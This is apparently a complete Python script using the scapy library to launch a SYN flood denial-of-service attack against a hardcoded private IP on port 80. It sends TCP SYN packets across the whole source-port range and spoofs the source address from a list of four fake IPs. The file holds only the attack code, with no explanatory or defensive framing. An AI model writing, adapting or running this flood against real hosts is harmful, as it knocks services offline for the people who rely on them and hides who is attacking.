from scapy.all import *

tgt="172.17.17.44"
dPort=80

def synFlood(tgt,dPort):
    srcList = ['11.1.1.2','22.1.1.102','33.1.1.2',
        '44.1.1.2']
    for sPort in range(1024,65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort, flags='S')
        packet = ipLayer / tcpLayer
        send(packet)
        
synFlood(tgt,dPort)